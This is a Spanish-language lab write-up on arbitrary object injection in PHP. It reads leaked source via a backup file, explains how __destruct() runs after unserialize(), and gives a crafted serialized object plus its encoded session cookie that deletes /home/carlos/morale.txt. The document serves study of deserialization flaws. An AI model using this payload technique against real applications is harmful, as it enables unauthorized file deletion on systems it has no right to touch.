---
title: "4 - Arbitrary object injection in PHP"
---

# 4 - Arbitrary object injection in PHP

Para leer el código fuente : 

```
GET /libs/CustomTemplate.php~
```

```PHP
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```


### 🛠 ¿Qué es `__destruct()` en PHP?

- `__destruct()` es un **método mágico** de PHP.
    
- Se llama **automáticamente** **cuando un objeto se destruye**.
    

¿Y **cuándo** PHP destruye un objeto?

- Cuando se termina el script.
    
- Cuando haces `unset($obj)`.
    
- Cuando el objeto **ya no es referenciado por ninguna variable** (recolector de basura).
    

---

### 🔥 En el caso de **deserialización**:

Cuando haces:

```php
$obj = unserialize($data);
```

- PHP crea el objeto (`$obj`).
    
- Si después el objeto **sale de scope**, **o el script termina**, o lo haces `unset($obj)`, entonces PHP llama **automáticamente** al método `__destruct()` **del objeto**.
    

**NO necesitas llamarlo manualmente.**  
**NO necesitas hacer nada especial.**

PHP **garantiza** que, cuando el objeto ya no es usado, ejecuta su `__destruct()`.

___

Lo convertimos a base64 y luego url encode :
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Cuando pase el garbage collector se eliminará el archivo :

```HTTP
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d
```
